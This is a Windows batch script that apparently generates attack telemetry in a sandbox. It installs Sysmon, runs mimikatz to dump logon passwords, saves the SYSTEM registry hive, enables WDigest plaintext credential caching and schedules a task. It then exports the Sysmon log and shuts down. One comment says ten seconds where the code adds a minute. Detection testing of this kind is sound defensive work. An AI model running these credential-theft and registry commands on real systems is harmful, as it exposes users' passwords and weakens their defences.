
    @echo off
    cd %USERPROFILE%\Desktop
    copy %USERPROFILE%\Desktop\SandboxFiles\Sysmon64.exe .
    copy %USERPROFILE%\Desktop\SandboxFiles\sysmonconfig.xml .
    copy %USERPROFILE%\Desktop\SandboxFiles\mimikatz.exe .
    copy %USERPROFILE%\Desktop\SandboxFiles\1.bat .
    Sysmon64.exe -accepteula -i sysmonconfig.xml
    ping 127.0.0.1 -n 6 > nul
    mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" exit

    copy %USERPROFILE%\Desktop\SandboxFiles\sysmonconfig.xml .

    whoami

    xcopy %USERPROFILE%\Desktop\SandboxFiles . /H /Y

    reg save HKLM\SYSTEM C:\system.save

    reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
     
    setlocal enabledelayedexpansion

    :: Get the current time
    for /f "tokens=1-4 delims=:.," %%a in ("%time%") do (
        set /a HH=%%a, MM=%%b, SS=%%c, FF=%%d
    )

    :: Add 10 seconds
    set /a MM+=1
    if !MM! geq 60 (
        set /a MM-=60
        set /a HH+=1
        if !HH! geq 24 set /a HH-=24
    )

    :: Format the time with leading zeros
    if !HH! lss 10 set HH=0!HH!
    if !MM! lss 10 set MM=0!MM!
    echo !HH!:!MM!
    :: Create the scheduled task
    schtasks /create /tn "MyTask" /tr "notepad.exe" /sc once /st !HH!:!MM! /f

    ping 127.0.0.1 -n 71 > nul
    wevtutil qe Microsoft-Windows-Sysmon/Operational /f:xml /e:root > %USERPROFILE%\Desktop\SandboxFiles\log.xml
    shutdown /s /f /t 0
    